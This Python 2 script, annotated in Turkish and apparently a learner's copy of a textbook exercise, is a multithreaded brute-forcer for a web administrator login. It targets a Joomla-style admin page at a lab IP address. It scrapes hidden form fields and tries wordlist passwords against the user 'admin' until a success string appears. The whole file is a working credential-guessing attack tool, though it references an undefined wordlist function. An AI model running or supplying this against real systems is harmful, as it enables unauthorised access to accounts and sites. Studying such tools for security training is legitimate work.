import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
# general settings
user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

# target specific settings
target_url = "http://192.168.112.131/administrator/index.php"#bu degikeni komut dosyamizin html'yi ilk indirip ayristirdigi yerdir.
target_post = "http://192.168.112.131/administrator/index.php"
#kaba zorlama girisimizi gonderecegimiz yerdir.
username_field= "username"
password_field= "passwd"
# bu fildler html alanlarina bakilarak degistirilebilinir.
success_check = "Administration - Control Panel"
#her kaba zorlamadan sonra kontrol edecegimiz bir dizedir.

class Bruter(object): # bu sinif tum http isteklerini ele alacak ve bizim icin tanimlama bilgilerini yonetecek olan birincil kaba kuvvet sinifimizdir. 
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print ("Finished setting up for: %s" % username)
    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")#cerezleri cerezler dosyasinda depolayacak olan filecookiejar sinifini kullanarak cerez kavanozumuzu kurariz.
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar)) # neyi gonderecegine dair
            
            response = opener.open(target_url)
            
            page = response.read()
            
            print ("Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize()))
            #ilk istek atilir ham html oldgundan onu parsera atariz 
            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)#geri alinan tum form ogelerinin sozlugunu donduren feed yontemini cagiririz.
            
            post_tags = parser.tag_results
            
            # add our username and password fields
            #ayristirma bitince kulllanici ad ve sifre alanlarina kaba zorlama  girisimizle degistiyoruz 
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            login_data = urllib.urlencode(post_tags)#sonra urlyi post degiskenlerini kodluyorz ve sonra onlari sonraki http istegimizde iletiyoruz
            login_response = opener.open(target_post, login_data)
            
            login_result = login_response.read()
            
            if success_check in login_result:#kimlik dogrulamanin basarili olup olmadigini test ediyoruz
                self.found = True
                print ("[*] Bruteforce successful.")
                print ("[*] Username: %s" % username)
                print ("[*] Password: %s" % brute)
                print ("[*] Waiting for other threads to exit...")
        
    
class BruteParser(HTMLParser):#htl islemimizin temeli
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}#sonuclarimizn saklanacagi bir sozluk olusturmak
#feed fonksiyonunu cagirdigimizda tumm html belgesine gecer ve bir etiketle her karsilasildiginda handle_starttag islevimiz cagrilir.
#htmlleri arar name niteliklerini bulursak bunlari tagresulta atar 
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            
            if tag_name is not None:
                self.tag_results[tag_name] = value

# bu hedefimize karsi kullanmak istedigimiz belirli html ayristirma sinifini olusturur . HTMLParser sinifni kullanmanin temellerini ogrendikten sonra saldiyor olabileceginiz herhangi bir web uygulmasindan bilgi ayiklamak icin onu yarlayabilirsiniz.
#html islendikten sonra bruteforcing sinifimiz alanlarin geri kalanini oldugu gibi birakirken kullanici adi ve parola alanarini degistirebilir.

# paste the build_wordlist function here

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
#kullanici adini ve kelime listemzii bruter sinifimiza aktariyoruz ve bu kadar